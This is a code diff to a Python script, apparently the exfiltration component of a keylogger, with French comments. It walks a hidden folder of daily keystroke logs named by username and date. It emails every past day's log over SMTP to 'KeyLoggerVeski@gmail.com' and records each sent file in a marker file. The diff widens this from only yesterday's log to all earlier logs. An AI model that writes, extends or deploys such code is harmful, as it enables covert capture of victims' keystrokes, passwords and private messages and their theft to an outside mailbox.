@@ -3,10 +3,11 @@ import datetime
 import time
 
 NOM_DOSSIER_SECRET = "C:/data_key_screen"
+dateajd = datetime.datetime.now().strftime('%Y-%m-%d')
 datehier = (datetime.datetime.now()++ datetime.timedelta(days=-1)).strftime('%Y-%m-%d')
 dateheure = datetime.datetime.now().strftime('%H:%M:%S')
 username = os.getlogin()
-nomfile_hier = username + " touch " + datehier + ".txt"
+
 
 import smtplib
 from email.mime.text import MIMEText
@@ -44,28 +45,36 @@ def email_alert(subject,body,to, liste_file=""):
     server.login(user,password)
     server.send_message(msg)
     
+    print("###" + subject + " ok the mail send to KeyLoggerVeski@gmail.com")
     server.quit()
 
-dossierhier = NOM_DOSSIER_SECRET+"/"+datehier
 
-def send_log_dossier(dossierhier):
+
+def send_log_dossier(NOM_DOSSIER_SECRET,dateee):
+	global dateheure
+	
+	dossierhier = NOM_DOSSIER_SECRET+"/"+dateee #le dossier
+	nomfile_hier = username + " touch " + dateee + ".txt" #le fichier log
 	if os.path.exists(dossierhier):
 		
 		if not os.path.exists(dossierhier +"/ok_sent.txt"):
 			listefichiers = [f"{dossierhier}/{nomfile_hier}"]
-			for fic in listefichiers:
-				print("ok send mail : "+fic)
-				
+							
 			email_alert(nomfile_hier,"yes","KeyLoggerVeski@gmail.com",listefichiers)
 			
 			#ok c'est fait, c'est noté
 			fichierok = open(dossierhier+"/ok_sent.txt", "a")
 			fichierok.write(f"{dossierhier}/{nomfile_hier} file sent at {dateheure},to KeyLoggerVeski@gmail.com \n")
 			fichierok.close()
-			print("### ok_sent.txt")
+			print("## " + dossierhier+"/ok_sent.txt")
 		else:
-			print(nomfile_hier + " DEJA ENVOYER CHKAL")
+			print(" * " + nomfile_hier + " DEJA ENVOYER CHKAL")
 
-send_log_dossier(dossierhier)				
+print(os.listdir(NOM_DOSSIER_SECRET))
+for dos in os.listdir(NOM_DOSSIER_SECRET):
+	if dos != dateajd:
+		send_log_dossier(NOM_DOSSIER_SECRET,dos)
+	else:
+		print(f" * dont sent dir of today {dateajd}")				
 
 staller = input("Press ENTER to close")
